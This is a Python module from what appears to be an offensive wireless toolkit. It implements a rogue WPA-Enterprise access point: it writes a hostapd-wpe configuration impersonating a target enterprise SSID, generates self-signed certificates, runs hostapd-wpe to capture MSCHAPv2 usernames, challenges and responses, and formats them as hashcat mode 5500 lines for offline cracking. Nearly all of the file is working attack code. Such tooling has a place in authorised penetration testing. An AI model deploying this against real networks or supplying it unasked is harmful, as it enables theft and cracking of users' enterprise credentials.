# SPDX-License-Identifier: GPL-3.0-or-later
# Copyright (c) 2025 Nerds489
"""WPA-Enterprise (EAP) attack: a rogue hostapd-wpe AP that captures MSCHAPv2.

A rogue RADIUS/EAP access point advertising the target's enterprise SSID makes a
client's supplicant authenticate against us, yielding the MSCHAPv2 username,
server challenge and client response, which crack offline (hashcat mode 5500,
NetNTLMv1). This composes the gated host-action seam (interface bring-up,
hostapd-wpe with a pidfile) and reuses the evil-twin lifecycle discipline
(publish state before mutating, dirty flag, pidfile teardown).

The credential parser and the hashcat formatter are pure and unit-tested.
"""
from __future__ import annotations

import re
from dataclasses import dataclass
from pathlib import Path

from netreaper.automation.handlers._host import run_host
from netreaper.core.constants import NETREAPER_CONFIG_DIR
from netreaper.core.logging import get_logger
from netreaper.core.validation import require_interface
from netreaper.wireless.eviltwin import channel_hw_mode

logger = get_logger(__name__)

_FIELD_RE = {
    "username": re.compile(r"username:\s*(.+?)\s*$", re.IGNORECASE),
    "challenge": re.compile(r"challenge:\s*([0-9a-fA-F:]+)", re.IGNORECASE),
    "response": re.compile(r"response:\s*([0-9a-fA-F:]+)", re.IGNORECASE),
}


@dataclass
class EnterpriseCredential:
    """A captured MSCHAPv2 credential (username, server challenge, response)."""

    username: str
    challenge: str
    response: str


def parse_enterprise_credentials(text: str) -> list[EnterpriseCredential]:
    """Parse hostapd-wpe log text into captured MSCHAPv2 credentials.

    A credential is emitted once a username, challenge and response have all been
    seen (the order hostapd-wpe logs them); the fields then reset for the next.
    """
    creds: list[EnterpriseCredential] = []
    username = challenge = response = None
    for line in text.splitlines():
        if (m := _FIELD_RE["username"].search(line)) is not None:
            username = m.group(1)
        elif (m := _FIELD_RE["challenge"].search(line)) is not None:
            challenge = m.group(1)
        elif (m := _FIELD_RE["response"].search(line)) is not None:
            response = m.group(1)
            if username and challenge and response:
                creds.append(EnterpriseCredential(username, challenge, response))
                username = challenge = response = None
    return creds


def hashcat_5500_line(cred: EnterpriseCredential) -> str:
    """Format a credential as a hashcat mode 5500 (NetNTLMv1) line."""
    challenge = cred.challenge.replace(":", "")
    response = cred.response.replace(":", "")
    return f"{cred.username}::::{response}:{challenge}"


def export_hashcat(creds: list[EnterpriseCredential]) -> str:
    """Return newline-joined hashcat 5500 lines for the given credentials."""
    return "\n".join(hashcat_5500_line(c) for c in creds)


def hostapd_wpe_config(
    interface: str, ssid: str, channel: int, cert_dir: Path, eap_user_file: Path
) -> str:
    """Build a hostapd-wpe.conf advertising an enterprise (WPA-EAP) SSID."""
    lines = [
        f"interface={interface}",
        "driver=nl80211",
        f"ssid={ssid}",
        f"hw_mode={channel_hw_mode(channel)}",
        f"channel={channel}",
        "ieee8021x=1",
        "eap_server=1",
        f"eap_user_file={eap_user_file}",
        f"ca_cert={cert_dir / 'ca.crt'}",
        f"server_cert={cert_dir / 'server.crt'}",
        f"private_key={cert_dir / 'server.key'}",
        "private_key_passwd=whatever",
        "wpa=2",
        "wpa_key_mgmt=WPA-EAP",
        "wpa_pairwise=CCMP",
    ]
    return "\n".join(lines) + "\n"


@dataclass
class EnterpriseState:
    interface: str
    ssid: str
    channel: int
    running: bool = False
    creds_log: str | None = None
    hostapd_pidfile: str | None = None
    dirty: bool = False


class EnterpriseAttack:
    """Stand up and tear down a rogue hostapd-wpe enterprise AP."""

    def __init__(self, runner=run_host) -> None:
        self._run = runner
        self.state: EnterpriseState | None = None

    async def start(
        self,
        interface: str,
        ssid: str,
        channel: int,
        *,
        gateway_ip: str = "10.0.0.1",
        config_dir: Path | None = None,
    ) -> EnterpriseState:
        """Generate config/certs, bring up the AP subnet, start hostapd-wpe."""
        if self.state is not None and self.state.dirty:
            raise RuntimeError("enterprise AP dirty; call stop() first")
        iface = require_interface(interface)
        cfg_dir = config_dir or (NETREAPER_CONFIG_DIR / "enterprise")
        cfg_dir.mkdir(parents=True, exist_ok=True)
        conf = cfg_dir / "hostapd-wpe.conf"
        pidfile = cfg_dir / "hostapd-wpe.pid"
        creds_log = cfg_dir / "hostapd-wpe.log"
        eap_user = cfg_dir / "hostapd-wpe.eap_user"
        eap_user.write_text('*\tPEAP,TTLS,TLS,MD5,GTC\n"t"\tTTLS-MSCHAPV2\t"t"\t[2]\n')
        conf.write_text(hostapd_wpe_config(iface, ssid, channel, cfg_dir, eap_user))

        state = EnterpriseState(
            iface, ssid, channel,
            creds_log=str(creds_log), hostapd_pidfile=str(pidfile),
        )
        self.state = state
        state.dirty = True  # a stop() is required before any restart from here

        # Self-signed cert chain hostapd-wpe presents to the supplicant.
        await self._generate_certs(cfg_dir)
        await self._run(["ip", "link", "set", iface, "down"], destructive=True)
        await self._run(["ip", "addr", "flush", "dev", iface], destructive=True)
        await self._run(["ip", "link", "set", iface, "up"], destructive=True)
        await self._run(["ip", "addr", "add", f"{gateway_ip}/24", "dev", iface],
                        destructive=True)
        await self._run(
            ["hostapd-wpe", "-B", "-P", str(pidfile), "-f", str(creds_log), str(conf)],
            destructive=True,
        )
        state.running = True
        logger.info("Enterprise AP '%s' up on %s ch %d", ssid, iface, channel)
        return state

    async def _generate_certs(self, cert_dir: Path) -> None:
        ca_key, ca_crt = cert_dir / "ca.key", cert_dir / "ca.crt"
        srv_key, srv_crt = cert_dir / "server.key", cert_dir / "server.crt"
        srv_csr = cert_dir / "server.csr"
        for cmd in (
            ["openssl", "genrsa", "-out", str(ca_key), "2048"],
            ["openssl", "req", "-new", "-x509", "-days", "3650", "-key", str(ca_key),
             "-out", str(ca_crt), "-subj", "/CN=NETREAPER Enterprise CA"],
            ["openssl", "genrsa", "-out", str(srv_key), "2048"],
            ["openssl", "req", "-new", "-key", str(srv_key), "-subj",
             "/CN=radius.local", "-out", str(srv_csr)],
            ["openssl", "x509", "-req", "-days", "365", "-in", str(srv_csr),
             "-CA", str(ca_crt), "-CAkey", str(ca_key),
             "-CAcreateserial", "-out", str(srv_crt)],
        ):
            await self._run(cmd, destructive=True)

    def read_credentials(self) -> list[EnterpriseCredential]:
        """Parse the credentials captured so far from the hostapd-wpe log."""
        if self.state is None or not self.state.creds_log:
            return []
        path = Path(self.state.creds_log)
        if not path.exists():
            return []
        return parse_enterprise_credentials(path.read_text(errors="replace"))

    async def stop(self) -> None:
        """Kill hostapd-wpe by pidfile and restore the interface."""
        state = self.state
        if state is None:
            return
        await self._kill_by_pidfile(state.hostapd_pidfile)
        await self._run(
            ["ip", "addr", "flush", "dev", state.interface], destructive=True
        )
        state.running = False
        state.dirty = False
        logger.info("Enterprise rogue AP '%s' torn down", state.ssid)

    async def _kill_by_pidfile(self, pidfile: str | None) -> None:
        if not pidfile:
            return
        path = Path(pidfile)
        if not path.exists():
            return
        try:
            pid = path.read_text().strip()
        except OSError:
            return
        if pid.isdigit():
            await self._run(["kill", pid], destructive=True)
